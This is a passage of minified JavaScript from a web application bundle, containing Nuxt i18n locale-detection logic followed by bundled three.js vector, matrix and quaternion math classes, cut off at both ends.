e.i18n.locale=n,c||e.i18n.onLanguageSwitched(h,n),g.next=18,regeneratorRuntime.awrap(Object(K.syncVuex)(a,n,e.i18n.getLocaleMessage(n)));case 18:c||Z.u===Z.g.NO_PREFIX||(p=e.i18n.__route,f=p&&p.name?e.getRouteBaseName(p):"index",m=e.localePath(Object.assign({},p,{name:f}),n),p&&p.path!==m&&s(m));case 19:case"end":return g.stop()}}))},e.i18n=new st.a(Z.v),e.i18n.locales=Z.q,e.i18n.defaultLocale=Z.j,e.i18n.differentDomains=Z.m,e.i18n.forwardedHost=Z.n,e.i18n.beforeLanguageSwitch=Z.i,e.i18n.onLanguageSwitched=Z.r,e.i18n.setLocaleCookie=u,e.i18n.getLocaleCookie=h,e.i18n.setLocale=function(t){return d(t)},e.i18n.__route=n,r.a.prototype.$nuxtI18nSeo=ct,a&&(a.$i18n=e.i18n,a.state.localeDomains&&e.i18n.locales.forEach((function(t){t.domain=a.state.localeDomains[t.code]}))),p=e.i18n.defaultLocale||null,e.i18n.differentDomains?(f=Object(K.getLocaleDomain)(e.i18n,o),p=f||p):Z.u!==Z.g.NO_PREFIX?(m=Object(K.getLocaleFromRoute)(n),p=m||p):l&&(_=h(),Z.p.includes(_)&&(p=_)),g.next=23,regeneratorRuntime.awrap(d(p,{initialSetup:!0}));case 23:return e.i18n.__detectBrowserLanguage=function(t){var i,n,r,a;return regeneratorRuntime.async((function(t){for(;;)switch(t.prev=t.next){case 0:if(!Z.l){t.next=15;break}if(i=Z.l.alwaysRedirect,n=Z.l.fallbackLocale,l&&(r=h())&&1!==r&&"1"!==r||("undefined"!=typeof navigator&&navigator.language?r=navigator.language.toLocaleLowerCase().substring(0,2):o&&void 0!==o.headers["accept-language"]&&(r=o.headers["accept-language"].split(",")[0].toLocaleLowerCase().substring(0,2))),!r){t.next=15;break}if(l&&!i&&h()){t.next=15;break}if(a=n,Z.p.includes(r)&&(a=r),!a||!Z.p.includes(a)){t.next=14;break}if(a===e.i18n.locale){t.next=13;break}return t.next=11,regeneratorRuntime.awrap(e.i18n.setLocale(a));case 11:t.next=14;break;case 13:l&&!h()&&e.i18n.setLocaleCookie(a);case 14:return t.abrupt("return",!0);case 15:return t.abrupt("return",!1);case 16:case"end":return t.stop()}}))},g.next=26,regeneratorRuntime.awrap(e.i18n.__detectBrowserLanguage(n));case 26:case"end":return g.stop()}}))},Mt=(i(24),0),Et=100,Lt=1e3,kt=1001,At=1002,Pt=1003,Ot=1004,Ct=1005,Rt=1006,It=1008,Ft=1009,Nt=1012,zt=1015,Dt=1016,Gt=1020,Ut=1022,Bt=1023,jt=1026,Wt=1027,Ht=33776,Vt=33778,Yt=33779,Xt=2400,$t=3e3,qt=3001,Zt={DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){for(var t=[],e=0;e<256;e++)t[e]=(e<16?"0":"")+e.toString(16);return function(){var e=4294967295*Math.random()|0,i=4294967295*Math.random()|0,n=4294967295*Math.random()|0,r=4294967295*Math.random()|0;return(t[255&e]+t[e>>8&255]+t[e>>16&255]+t[e>>24&255]+"-"+t[255&i]+t[i>>8&255]+"-"+t[i>>16&15|64]+t[i>>24&255]+"-"+t[63&n|128]+t[n>>8&255]+"-"+t[n>>16&255]+t[n>>24&255]+t[255&r]+t[r>>8&255]+t[r>>16&255]+t[r>>24&255]).toUpperCase()}}(),clamp:function(t,e,i){return Math.max(e,Math.min(i,t))},euclideanModulo:function(t,e){return(t%e+e)%e},mapLinear:function(t,e,i,n,r){return n+(t-e)*(r-n)/(i-e)},lerp:function(t,e,i){return(1-i)*t+i*e},smoothstep:function(t,e,i){return t<=e?0:t>=i?1:(t=(t-e)/(i-e))*t*(3-2*t)},smootherstep:function(t,e,i){return t<=e?0:t>=i?1:(t=(t-e)/(i-e))*t*t*(t*(6*t-15)+10)},randInt:function(t,e){return t+Math.floor(Math.random()*(e-t+1))},randFloat:function(t,e){return t+Math.random()*(e-t)},randFloatSpread:function(t){return t*(.5-Math.random())},degToRad:function(t){return t*Zt.DEG2RAD},radToDeg:function(t){return t*Zt.RAD2DEG},isPowerOfTwo:function(t){return 0==(t&t-1)&&0!==t},ceilPowerOfTwo:function(t){return Math.pow(2,Math.ceil(Math.log(t)/Math.LN2))},floorPowerOfTwo:function(t){return Math.pow(2,Math.floor(Math.log(t)/Math.LN2))}};function Kt(){}function Jt(t,e){this.x=t||0,this.y=e||0}function Qt(){this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]}function te(t,e,i,n){this._x=t||0,this._y=e||0,this._z=i||0,this._w=void 0!==n?n:1}function ee(t,e,i){this.x=t||0,this.y=e||0,this.z=i||0}function ie(){this.elements=[1,0,0,0,1,0,0,0,1]}i(60),Object.assign(Kt.prototype,{addEventListener:function(t,e){void 0===this._listeners&&(this._listeners={});var i=this._listeners;void 0===i[t]&&(i[t]=[]),-1===i[t].indexOf(e)&&i[t].push(e)},hasEventListener:function(t,e){if(void 0===this._listeners)return!1;var i=this._listeners;return void 0!==i[t]&&-1!==i[t].indexOf(e)},removeEventListener:function(t,e){if(void 0!==this._listeners){var i=this._listeners[t];if(void 0!==i){var n=i.indexOf(e);-1!==n&&i.splice(n,1)}}},dispatchEvent:function(t){if(void 0!==this._listeners){var e=this._listeners[t.type];if(void 0!==e){t.target=this;for(var i=e.slice(0),n=0,r=i.length;n<r;n++)i[n].call(this,t)}}}}),Object.defineProperties(Jt.prototype,{width:{get:function(){return this.x},set:function(t){this.x=t}},height:{get:function(){return this.y},set:function(t){this.y=t}}}),Object.assign(Jt.prototype,{isVector2:!0,set:function(t,e){return this.x=t,this.y=e,this},setScalar:function(t){return this.x=t,this.y=t,this},setX:function(t){return this.x=t,this},setY:function(t){return this.y=t,this},setComponent:function(t,e){switch(t){case 0:this.x=e;break;case 1:this.y=e;break;default:throw new Error("index is out of range: "+t)}return this},getComponent:function(t){switch(t){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+t)}},clone:function(){return new this.constructor(this.x,this.y)},copy:function(t){return this.x=t.x,this.y=t.y,this},add:function(t,e){return void 0!==e?this.addVectors(t,e):(this.x+=t.x,this.y+=t.y,this)},addScalar:function(t){return this.x+=t,this.y+=t,this},addVectors:function(t,e){return this.x=t.x+e.x,this.y=t.y+e.y,this},addScaledVector:function(t,e){return this.x+=t.x*e,this.y+=t.y*e,this},sub:function(t,e){return void 0!==e?this.subVectors(t,e):(this.x-=t.x,this.y-=t.y,this)},subScalar:function(t){return this.x-=t,this.y-=t,this},subVectors:function(t,e){return this.x=t.x-e.x,this.y=t.y-e.y,this},multiply:function(t){return this.x*=t.x,this.y*=t.y,this},multiplyScalar:function(t){return this.x*=t,this.y*=t,this},divide:function(t){return this.x/=t.x,this.y/=t.y,this},divideScalar:function(t){return this.multiplyScalar(1/t)},applyMatrix3:function(t){var e=this.x,i=this.y,n=t.elements;return this.x=n[0]*e+n[3]*i+n[6],this.y=n[1]*e+n[4]*i+n[7],this},min:function(t){return this.x=Math.min(this.x,t.x),this.y=Math.min(this.y,t.y),this},max:function(t){return this.x=Math.max(this.x,t.x),this.y=Math.max(this.y,t.y),this},clamp:function(t,e){return this.x=Math.max(t.x,Math.min(e.x,this.x)),this.y=Math.max(t.y,Math.min(e.y,this.y)),this},clampScalar:(dt=new Jt,pt=new Jt,function(t,e){return dt.set(t,t),pt.set(e,e),this.clamp(dt,pt)}),clampLength:function(t,e){var i=this.length();return this.divideScalar(i||1).multiplyScalar(Math.max(t,Math.min(e,i)))},floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this},roundToZero:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this},negate:function(){return this.x=-this.x,this.y=-this.y,this},dot:function(t){return this.x*t.x+this.y*t.y},cross:function(t){return this.x*t.y-this.y*t.x},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)},normalize:function(){return this.divideScalar(this.length()||1)},angle:function(){var t=Math.atan2(this.y,this.x);return t<0&&(t+=2*Math.PI),t},distanceTo:function(t){return Math.sqrt(this.distanceToSquared(t))},distanceToSquared:function(t){var e=this.x-t.x,i=this.y-t.y;return e*e+i*i},manhattanDistanceTo:function(t){return Math.abs(this.x-t.x)+Math.abs(this.y-t.y)},setLength:function(t){return this.normalize().multiplyScalar(t)},lerp:function(t,e){return this.x+=(t.x-this.x)*e,this.y+=(t.y-this.y)*e,this},lerpVectors:function(t,e,i){return this.subVectors(e,t).multiplyScalar(i).add(t)},equals:function(t){return t.x===this.x&&t.y===this.y},fromArray:function(t,e){return void 0===e&&(e=0),this.x=t[e],this.y=t[e+1],this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this.x,t[e+1]=this.y,t},fromBufferAttribute:function(t,e,i){return this.x=t.getX(e),this.y=t.getY(e),this},rotateAround:function(t,e){var i=Math.cos(e),n=Math.sin(e),r=this.x-t.x,a=this.y-t.y;return this.x=r*i-a*n+t.x,this.y=r*n+a*i+t.y,this}}),i(61),Object.assign(Qt.prototype,{isMatrix4:!0,set:function(t,e,i,n,r,a,o,s,l,c,h,u,d,p,f,m){var _=this.elements;return _[0]=t,_[4]=e,_[8]=i,_[12]=n,_[1]=r,_[5]=a,_[9]=o,_[13]=s,_[2]=l,_[6]=c,_[10]=h,_[14]=u,_[3]=d,_[7]=p,_[11]=f,_[15]=m,this},identity:function(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this},clone:function(){return(new Qt).fromArray(this.elements)},copy:function(t){var e=this.elements,i=t.elements;return e[0]=i[0],e[1]=i[1],e[2]=i[2],e[3]=i[3],e[4]=i[4],e[5]=i[5],e[6]=i[6],e[7]=i[7],e[8]=i[8],e[9]=i[9],e[10]=i[10],e[11]=i[11],e[12]=i[12],e[13]=i[13],e[14]=i[14],e[15]=i[15],this},copyPosition:function(t){var e=this.elements,i=t.elements;return e[12]=i[12],e[13]=i[13],e[14]=i[14],this},extractBasis:function(t,e,i){return t.setFromMatrixColumn(this,0),e.setFromMatrixColumn(this,1),i.setFromMatrixColumn(this,2),this},makeBasis:function(t,e,i){return this.set(t.x,e.x,i.x,0,t.y,e.y,i.y,0,t.z,e.z,i.z,0,0,0,0,1),this},extractRotation:(bt=new ee,function(t){var e=this.elements,i=t.elements,n=1/bt.setFromMatrixColumn(t,0).length(),r=1/bt.setFromMatrixColumn(t,1).length(),a=1/bt.setFromMatrixColumn(t,2).length();return e[0]=i[0]*n,e[1]=i[1]*n,e[2]=i[2]*n,e[3]=0,e[4]=i[4]*r,e[5]=i[5]*r,e[6]=i[6]*r,e[7]=0,e[8]=i[8]*a,e[9]=i[9]*a,e[10]=i[10]*a,e[11]=0,e[12]=0,e[13]=0,e[14]=0,e[15]=1,this}),makeRotationFromEuler:function(t){!t||t.isEuler;var e=this.elements,i=t.x,n=t.y,r=t.z,a=Math.cos(i),o=Math.sin(i),s=Math.cos(n),l=Math.sin(n),c=Math.cos(r),h=Math.sin(r);if("XYZ"===t.order){var u=a*c,d=a*h,p=o*c,f=o*h;e[0]=s*c,e[4]=-s*h,e[8]=l,e[1]=d+p*l,e[5]=u-f*l,e[9]=-o*s,e[2]=f-u*l,e[6]=p+d*l,e[10]=a*s}else if("YXZ"===t.order){var m=s*c,_=s*h,g=l*c,v=l*h;e[0]=m+v*o,e[4]=g*o-_,e[8]=a*l,e[1]=a*h,e[5]=a*c,e[9]=-o,e[2]=_*o-g,e[6]=v+m*o,e[10]=a*s}else if("ZXY"===t.order)m=s*c,_=s*h,g=l*c,v=l*h,e[0]=m-v*o,e[4]=-a*h,e[8]=g+_*o,e[1]=_+g*o,e[5]=a*c,e[9]=v-m*o,e[2]=-a*l,e[6]=o,e[10]=a*s;else if("ZYX"===t.order)u=a*c,d=a*h,p=o*c,f=o*h,e[0]=s*c,e[4]=p*l-d,e[8]=u*l+f,e[1]=s*h,e[5]=f*l+u,e[9]=d*l-p,e[2]=-l,e[6]=o*s,e[10]=a*s;else if("YZX"===t.order){var y=a*s,x=a*l,b=o*s,w=o*l;e[0]=s*c,e[4]=w-y*h,e[8]=b*h+x,e[1]=h,e[5]=a*c,e[9]=-o*c,e[2]=-l*c,e[6]=x*h+b,e[10]=y-w*h}else"XZY"===t.order&&(y=a*s,x=a*l,b=o*s,w=o*l,e[0]=s*c,e[4]=-h,e[8]=l*c,e[1]=y*h+w,e[5]=a*c,e[9]=x*h-b,e[2]=b*h-x,e[6]=o*c,e[10]=w*h+y);return e[3]=0,e[7]=0,e[11]=0,e[12]=0,e[13]=0,e[14]=0,e[15]=1,this},makeRotationFromQuaternion:(yt=new ee(0,0,0),xt=new ee(1,1,1),function(t){return this.compose(yt,t,xt)}),lookAt:(_t=new ee,gt=new ee,vt=new ee,function(t,e,i){var n=this.elements;return vt.subVectors(t,e),0===vt.lengthSq()&&(vt.z=1),vt.normalize(),_t.crossVectors(i,vt),0===_t.lengthSq()&&(1===Math.abs(i.z)?vt.x+=1e-4:vt.z+=1e-4,vt.normalize(),_t.crossVectors(i,vt)),_t.normalize(),gt.crossVectors(vt,_t),n[0]=_t.x,n[4]=gt.x,n[8]=vt.x,n[1]=_t.y,n[5]=gt.y,n[9]=vt.y,n[2]=_t.z,n[6]=gt.z,n[10]=vt.z,this}),multiply:function(t,e){return void 0!==e?this.multiplyMatrices(t,e):this.multiplyMatrices(this,t)},premultiply:function(t){return this.multiplyMatrices(t,this)},multiplyMatrices:function(t,e){var i=t.elements,n=e.elements,r=this.elements,a=i[0],o=i[4],s=i[8],l=i[12],c=i[1],h=i[5],u=i[9],d=i[13],p=i[2],f=i[6],m=i[10],_=i[14],g=i[3],v=i[7],y=i[11],x=i[15],b=n[0],w=n[4],T=n[8],S=n[12],M=n[1],E=n[5],L=n[9],k=n[13],A=n[2],P=n[6],O=n[10],C=n[14],R=n[3],I=n[7],F=n[11],N=n[15];return r[0]=a*b+o*M+s*A+l*R,r[4]=a*w+o*E+s*P+l*I,r[8]=a*T+o*L+s*O+l*F,r[12]=a*S+o*k+s*C+l*N,r[1]=c*b+h*M+u*A+d*R,r[5]=c*w+h*E+u*P+d*I,r[9]=c*T+h*L+u*O+d*F,r[13]=c*S+h*k+u*C+d*N,r[2]=p*b+f*M+m*A+_*R,r[6]=p*w+f*E+m*P+_*I,r[10]=p*T+f*L+m*O+_*F,r[14]=p*S+f*k+m*C+_*N,r[3]=g*b+v*M+y*A+x*R,r[7]=g*w+v*E+y*P+x*I,r[11]=g*T+v*L+y*O+x*F,r[15]=g*S+v*k+y*C+x*N,this},multiplyScalar:function(t){var e=this.elements;return e[0]*=t,e[4]*=t,e[8]*=t,e[12]*=t,e[1]*=t,e[5]*=t,e[9]*=t,e[13]*=t,e[2]*=t,e[6]*=t,e[10]*=t,e[14]*=t,e[3]*=t,e[7]*=t,e[11]*=t,e[15]*=t,this},applyToBufferAttribute:function(){var t=new ee;return function(e){for(var i=0,n=e.count;i<n;i++)t.x=e.getX(i),t.y=e.getY(i),t.z=e.getZ(i),t.applyMatrix4(this),e.setXYZ(i,t.x,t.y,t.z);return e}}(),determinant:function(){var t=this.elements,e=t[0],i=t[4],n=t[8],r=t[12],a=t[1],o=t[5],s=t[9],l=t[13],c=t[2],h=t[6],u=t[10],d=t[14];return t[3]*(+r*s*h-n*l*h-r*o*u+i*l*u+n*o*d-i*s*d)+t[7]*(+e*s*d-e*l*u+r*a*u-n*a*d+n*l*c-r*s*c)+t[11]*(+e*l*h-e*o*d-r*a*h+i*a*d+r*o*c-i*l*c)+t[15]*(-n*o*c-e*s*h+e*o*u+n*a*h-i*a*u+i*s*c)},transpose:function(){var t,e=this.elements;return t=e[1],e[1]=e[4],e[4]=t,t=e[2],e[2]=e[8],e[8]=t,t=e[6],e[6]=e[9],e[9]=t,t=e[3],e[3]=e[12],e[12]=t,t=e[7],e[7]=e[13],e[13]=t,t=e[11],e[11]=e[14],e[14]=t,this},setPosition:function(t){var e=this.elements;return e[12]=t.x,e[13]=t.y,e[14]=t.z,this},getInverse:function(t,e){var i=this.elements,n=t.elements,r=n[0],a=n[1],o=n[2],s=n[3],l=n[4],c=n[5],h=n[6],u=n[7],d=n[8],p=n[9],f=n[10],m=n[11],_=n[12],g=n[13],v=n[14],y=n[15],x=p*v*u-g*f*u+g*h*m-c*v*m-p*h*y+c*f*y,b=_*f*u-d*v*u-_*h*m+l*v*m+d*h*y-l*f*y,w=d*g*u-_*p*u+_*c*m-l*g*m-d*c*y+l*p*y,T=_*p*h-d*g*h-_*c*f+l*g*f+d*c*v-l*p*v,S=r*x+a*b+o*w+s*T;if(0===S){if(!0===e)throw new Error("Matrix4: .getInverse() can't invert matrix, determinant is 0");return this.identity()}var M=1/S;return i[0]=x*M,i[1]=(g*f*s-p*v*s-g*o*m+a*v*m+p*o*y-a*f*y)*M,i[2]=(c*v*s-g*h*s+g*o*u-a*v*u-c*o*y+a*h*y)*M,i[3]=(p*h*s-c*f*s-p*o*u+a*f*u+c*o*m-a*h*m)*M,i[4]=b*M,i[5]=(d*v*s-_*f*s+_*o*m-r*v*m-d*o*y+r*f*y)*M,i[6]=(_*h*s-l*v*s-_*o*u+r*v*u+l*o*y-r*h*y)*M,i[7]=(l*f*s-d*h*s+d*o*u-r*f*u-l*o*m+r*h*m)*M,i[8]=w*M,i[9]=(_*p*s-d*g*s-_*a*m+r*g*m+d*a*y-r*p*y)*M,i[10]=(l*g*s-_*c*s+_*a*u-r*g*u-l*a*y+r*c*y)*M,i[11]=(d*c*s-l*p*s-d*a*u+r*p*u+l*a*m-r*c*m)*M,i[12]=T*M,i[13]=(d*g*o-_*p*o+_*a*f-r*g*f-d*a*v+r*p*v)*M,i[14]=(_*c*o-l*g*o-_*a*h+r*g*h+l*a*v-r*c*v)*M,i[15]=(l*p*o-d*c*o+d*a*h-r*p*h-l*a*f+r*c*f)*M,this},scale:function(t){var e=this.elements,i=t.x,n=t.y,r=t.z;return e[0]*=i,e[4]*=n,e[8]*=r,e[1]*=i,e[5]*=n,e[9]*=r,e[2]*=i,e[6]*=n,e[10]*=r,e[3]*=i,e[7]*=n,e[11]*=r,this},getMaxScaleOnAxis:function(){var t=this.elements,e=t[0]*t[0]+t[1]*t[1]+t[2]*t[2],i=t[4]*t[4]+t[5]*t[5]+t[6]*t[6],n=t[8]*t[8]+t[9]*t[9]+t[10]*t[10];return Math.sqrt(Math.max(e,i,n))},makeTranslation:function(t,e,i){return this.set(1,0,0,t,0,1,0,e,0,0,1,i,0,0,0,1),this},makeRotationX:function(t){var e=Math.cos(t),i=Math.sin(t);return this.set(1,0,0,0,0,e,-i,0,0,i,e,0,0,0,0,1),this},makeRotationY:function(t){var e=Math.cos(t),i=Math.sin(t);return this.set(e,0,i,0,0,1,0,0,-i,0,e,0,0,0,0,1),this},makeRotationZ:function(t){var e=Math.cos(t),i=Math.sin(t);return this.set(e,-i,0,0,i,e,0,0,0,0,1,0,0,0,0,1),this},makeRotationAxis:function(t,e){var i=Math.cos(e),n=Math.sin(e),r=1-i,a=t.x,o=t.y,s=t.z,l=r*a,c=r*o;return this.set(l*a+i,l*o-n*s,l*s+n*o,0,l*o+n*s,c*o+i,c*s-n*a,0,l*s-n*o,c*s+n*a,r*s*s+i,0,0,0,0,1),this},makeScale:function(t,e,i){return this.set(t,0,0,0,0,e,0,0,0,0,i,0,0,0,0,1),this},makeShear:function(t,e,i){return this.set(1,e,i,0,t,1,i,0,t,e,1,0,0,0,0,1),this},compose:function(t,e,i){var n=this.elements,r=e._x,a=e._y,o=e._z,s=e._w,l=r+r,c=a+a,h=o+o,u=r*l,d=r*c,p=r*h,f=a*c,m=a*h,_=o*h,g=s*l,v=s*c,y=s*h,x=i.x,b=i.y,w=i.z;return n[0]=(1-(f+_))*x,n[1]=(d+y)*x,n[2]=(p-v)*x,n[3]=0,n[4]=(d-y)*b,n[5]=(1-(u+_))*b,n[6]=(m+g)*b,n[7]=0,n[8]=(p+v)*w,n[9]=(m-g)*w,n[10]=(1-(u+f))*w,n[11]=0,n[12]=t.x,n[13]=t.y,n[14]=t.z,n[15]=1,this},decompose:(ft=new ee,mt=new Qt,function(t,e,i){var n=this.elements,r=ft.set(n[0],n[1],n[2]).length(),a=ft.set(n[4],n[5],n[6]).length(),o=ft.set(n[8],n[9],n[10]).length();this.determinant()<0&&(r=-r),t.x=n[12],t.y=n[13],t.z=n[14],mt.copy(this);var s=1/r,l=1/a,c=1/o;return mt.elements[0]*=s,mt.elements[1]*=s,mt.elements[2]*=s,mt.elements[4]*=l,mt.elements[5]*=l,mt.elements[6]*=l,mt.elements[8]*=c,mt.elements[9]*=c,mt.elements[10]*=c,e.setFromRotationMatrix(mt),i.x=r,i.y=a,i.z=o,this}),makePerspective:function(t,e,i,n,r,a){var o=this.elements,s=2*r/(e-t),l=2*r/(i-n),c=(e+t)/(e-t),h=(i+n)/(i-n),u=-(a+r)/(a-r),d=-2*a*r/(a-r);return o[0]=s,o[4]=0,o[8]=c,o[12]=0,o[1]=0,o[5]=l,o[9]=h,o[13]=0,o[2]=0,o[6]=0,o[10]=u,o[14]=d,o[3]=0,o[7]=0,o[11]=-1,o[15]=0,this},makeOrthographic:function(t,e,i,n,r,a){var o=this.elements,s=1/(e-t),l=1/(i-n),c=1/(a-r),h=(e+t)*s,u=(i+n)*l,d=(a+r)*c;return o[0]=2*s,o[4]=0,o[8]=0,o[12]=-h,o[1]=0,o[5]=2*l,o[9]=0,o[13]=-u,o[2]=0,o[6]=0,o[10]=-2*c,o[14]=-d,o[3]=0,o[7]=0,o[11]=0,o[15]=1,this},equals:function(t){for(var e=this.elements,i=t.elements,n=0;n<16;n++)if(e[n]!==i[n])return!1;return!0},fromArray:function(t,e){void 0===e&&(e=0);for(var i=0;i<16;i++)this.elements[i]=t[i+e];return this},toArray:function(t,e){void 0===t&&(t=[]),void 0===e&&(e=0);var i=this.elements;return t[e]=i[0],t[e+1]=i[1],t[e+2]=i[2],t[e+3]=i[3],t[e+4]=i[4],t[e+5]=i[5],t[e+6]=i[6],t[e+7]=i[7],t[e+8]=i[8],t[e+9]=i[9],t[e+10]=i[10],t[e+11]=i[11],t[e+12]=i[12],t[e+13]=i[13],t[e+14]=i[14],t[e+15]=i[15],t}}),i(25),i(153),Object.assign(te,{slerp:function(t,e,i,n){return i.copy(t).slerp(e,n)},slerpFlat:function(t,e,i,n,r,a,o){var s=i[n+0],l=i[n+1],c=i[n+2],h=i[n+3],u=r[a+0],d=r[a+1],p=r[a+2],f=r[a+3];if(h!==f||s!==u||l!==d||c!==p){var m=1-o,_=s*u+l*d+c*p+h*f,g=_>=0?1:-1,v=1-_*_;if(v>Number.EPSILON){var y=Math.sqrt(v),x=Math.atan2(y,_*g);m=Math.sin(m*x)/y,o=Math.sin(o*x)/y}var b=o*g;if(s=s*m+u*b,l=l*m+d*b,c=c*m+p*b,h=h*m+f*b,m===1-o){var w=1/Math.sqrt(s*s+l*l+c*c+h*h);s*=w,l*=w,c*=w,h*=w}}t[e]=s,t[e+1]=l,t[e+2]=c,t[e+3]=h}}),Object.defineProperties(te.prototype,{x:{get:function(){return this._x},set:function(t){this._x=t,this.onChangeCallback()}},y:{get:function(){return this._y},set:function(t){this._y=t,this.onChangeCallback()}},z:{get:function(){return this._z},set:function(t){this._z=t,this.onChangeCallback()}},w:{get:function(){return this._w},set:function(t){this._w=t,this.onChangeCallback()}}}),Object.assign(te.prototype,{isQuaternion:!0,set:function(t,e,i,n){return this._x=t,this._y=e,this._z=i,this._w=n,this.onChangeCallback(),this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._w)},copy:function(t){return this._x=t.x,this._y=t.y,this._z=t.z,this._w=t.w,this.onChangeCallback(),this},setFromEuler:function(t,e){if(!t||!t.isEuler)throw new Error("Quaternion: .setFromEuler() now expects an Euler rotation rather than a Vector3 and order.");var i=t._x,n=t._y,r=t._z,a=t.order,o=Math.cos,s=Math.sin,l=o(i/2),c=o(n/2),h=o(r/2),u=s(i/2),d=s(n/2),p=s(r/2);return"XYZ"===a?(this._x=u*c*h+l*d*p,this._y=l*d*h-u*c*p,this._z=l*c*p+u*d*h,this._w=l*c*h-u*d*p):"YXZ"===a?(this._x=u*c*h+l*d*p,this._y=l*d*h-u*c*p,this._z=l*c*p-u*d*h,this._w=l*c*h+u*d*p):"ZXY"===a?(this._x=u*c*h-l*d*p,this._y=l*d*h+u*c*p,this._z=l*c*p+u*d*h,this._w=l*c*h-u*d*p):"ZYX"===a?(this._x=u*c*h-l*d*p,this._y=l*d*h+u*c*p,this._z=l*c*p-u*d*h,this._w=l*c*h+u*d*p):"YZX"===a?(this._x=u*c*h+l*d*p,this._y=l*d*h+u*c*p,this._z=l*c*p-u*d*h,this._w=l*c*h-u*d*p):"XZY"===a&&(this._x=u*c*h-l*d*p,this._y=l*d*h-u*c*p,this._z=l*c*p+u*d*h,this._w=l*c*h+u*d*p),!1!==e&&this.onChangeCallback(),this},setFromAxisAngle:function(t,e){var i=e/2,n=Math.sin(i);return this._x=t.x*n,this._y=t.y*n,this._z=t.z*n,this._w=Math.cos(i),this.onChangeCallback(),this},setFromRotationMatrix:function(t){var e,i=t.elements,n=i[0],r=i[4],a=i[8],o=i[1],s=i[5],l=i[9],c=i[2],h=i[6],u=i[10],d=n+s+u;return d>0?(e=.5/Math.sqrt(d+1),this._w=.25/e,this._x=(h-l)*e,this._y=(a-c)*e,this._z=(o-r)*e):n>s&&n>u?(e=2*Math.sqrt(1+n-s-u),this._w=(h-l)/e,this._x=.25*e,this._y=(r+o)/e,this._z=(a+c)/e):s>u?(e=2*Math.sqrt(1+s-n-u),this._w=(a-c)/e,this._x=(r+o)/e,this._y=.25*e,this._z=(l+h)/e):(e=2*Math.sqrt(1+u-n-s),this._w=(o-r)/e,this._x=(a+c)/e,this._y=(l+h)/e,this._z=.25*e),this.onChangeCallback(),this},setFromUnitVectors:function(){var t,e=new ee;return function(i,n){return void 0===e&&(e=new ee),(t=i.dot(n)+1)<1e-6?(t=0,Math.abs(i.x)>Math.abs(i.z)?e.set(-i.y,i.x,0):e.set(0,-i.z,i.y)):e.crossVectors(i,n),this._x=e.x,this._y=e.y,this._z=e.z,this._w=t,this.normalize()}}(),angleTo:function(t){return 2*Math.acos(Math.abs(Zt.clamp(this.dot(t),-1,1)))},rotateTowards:function(t,e){var i=this.angleTo(t);if(0===i)return this;var n=Math.min(1,e/i);return this.slerp(t,n),this},inverse:function(){return this.conjugate()},conjugate:function(){return this._x*=-1,this._y*=-1,this._z*=-1,this.onChangeCallback(),this},dot:function(t){return this._x*t._x+this._y*t._y+this._z*t._z+this._w*t._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var t=this.length();return 0===t?(this._x=0,this._y=0,this._z=0,this._w=1):(t=1/t,this._x=this._x*t,this._y=this._y*t,this._z=this._z*t,this._w=this._w*t),this.onChangeCallback(),this},multiply:function(t,e){return void 0!==e?this.multiplyQuaternions(t,e):this.multiplyQuaternions(this,t)},premultiply:function(t){return this.multiplyQuaternions(t,this)},multiplyQuaternions:function(t,e){var i=t._x,n=t._y,r=t._z,a=t._w,o=e._x,s=e._y,l=e._z,c=e._w;return this._x=i*c+a*o+n*l-r*s,this._y=n*c+a*s+r*o-i*l,this._z=r*c+a*l+i*s-n*o,this._w=a*c-i*o-n*s-r*l,this.onChangeCallback(),this},slerp:function(t,e){if(0===e)return this;if(1===e)return this.copy(t);var i=this._x,n=this._y,r=this._z,a=this._w,o=a*t._w+i*t._x+n*t._y+r*t._z;if(o<0?(this._w=-t._w,this._x=-t._x,this._y=-t._y,this._z=-t._z,o=-o):this.copy(t),o>=1)return this._w=a,this._x=i,this._y=n,this._z=r,this;var s=1-o*o;if(s<=Number.EPSILON){var l=1-e;return this._w=l*a+e*this._w,this._x=l*i+e*this._x,this._y=l*n+e*this._y,this._z=l*r+e*this._z,this.normalize()}var c=Math.sqrt(s),h=Math.atan2(c,o),u=Math.sin((1-e)*h)/c,d=Math.sin(e*h)/c;return this._w=a*u+this._w*d,this._x=i*u+this._x*d,this._y=n*u+this._y*d,this._z=r*u+this._z*d,this.onChangeCallback(),this},equals:function(t){return t._x===this._x&&t._y===this._y&&t._z===this._z&&t._w===this._w},fromArray:function(t,e){return void 0===e&&(e=0),this._x=t[e],this._y=t[e+1],this._z=t[e+2],this._w=t[e+3],this.onChangeCallback(),this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this._x,t[e+1]=this._y,t[e+2]=this._z,t[e+3]=this._w,t},onChange:function(t){return this.onChangeCallback=t,this},onChangeCallback:function(){}}),Object.assign(ee.prototype,{isVector3:!0,set:function(t,e,i){return this.x=t,this.y=e,this.z=i,this},setScalar:function(t){return this.x=t,this.y=t,this.z=t,this},setX:function(t){return this.x=t,this},setY:function(t){return this.y=t,this},setZ:function(t){return this.z=t,this},setComponent:function(t,e){switch(t){case 0:this.x=e;break;case 1:this.y=e;break;case 2:this.z=e;break;default:throw new Error("index is out of range: "+t)}return this},getComponent:function(t){switch(t){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+t)}},clone:function(){return new this.constructor(this.x,this.y,this.z)},copy:function(t){return this.x=t.x,this.y=t.y,this.z=t.z,this},add:function(t,e){return void 